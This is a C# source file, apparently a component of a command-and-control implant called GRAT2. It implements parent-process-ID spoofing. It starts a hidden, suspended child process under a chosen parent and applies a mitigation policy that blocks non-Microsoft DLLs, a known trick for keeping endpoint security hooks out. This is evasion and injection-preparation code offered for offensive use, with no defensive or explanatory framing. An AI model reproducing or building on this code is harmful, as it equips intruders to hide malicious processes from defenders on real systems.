using System;
using System.Runtime.InteropServices;
using static GRAT2_Client.PInvoke.flags;
using GRAT2_Client.PInvoke;

namespace GRAT2_Client.Injectious
{
    class PPID
    {
        public class ParentPidSpoofing
        {
            // https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch


            public PROCESS_INFORMATION ParentSpoofing(int parentID, string childPath)
            {
                parentID = SearchPID.SearchForPPID();
                // https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch
                const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
                const int STARTF_USESTDHANDLES = 0x00000100;
                const int STARTF_USESHOWWINDOW = 0x00000001;
                const ushort SW_HIDE = 0x0000;

                // Mitigation Policy
                const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
                const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;

                var blockMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);

                var pInfo = new PROCESS_INFORMATION();
                var siEx = new STARTUPINFOEX();

                IntPtr lpValueProc = IntPtr.Zero;
                IntPtr hSourceProcessHandle = IntPtr.Zero;
                var lpSize = IntPtr.Zero;

                Interop.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                Interop.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);

                if (IntPtr.Size == 4)
                {
                    Marshal.WriteIntPtr(blockMitigationPolicy, IntPtr.Zero);
                }
                else
                {
                    Marshal.WriteIntPtr(blockMitigationPolicy, new IntPtr((long)BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
                }

                Interop.UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, blockMitigationPolicy, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                IntPtr parentHandle = Interop.OpenProcess((uint)ProcessAccessRights.CreateProcess | (uint)ProcessAccessRights.DuplicateHandle, false, (uint)parentID);

                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, parentHandle);

                Interop.UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
                siEx.StartupInfo.wShowWindow = SW_HIDE;

                var ps = new SECURITY_ATTRIBUTES();
                var ts = new SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);

                try
                {
                    bool ProcCreate = Interop.CreateProcess(childPath, null, ref ps, ref ts, true, flags.ProcessCreationFlags.CREATE_SUSPENDED | flags.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | flags.ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
                    if (!ProcCreate)
                    {

                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                    Console.WriteLine(ex.Message);
                }
                return pInfo;
            }
        }
        }
}
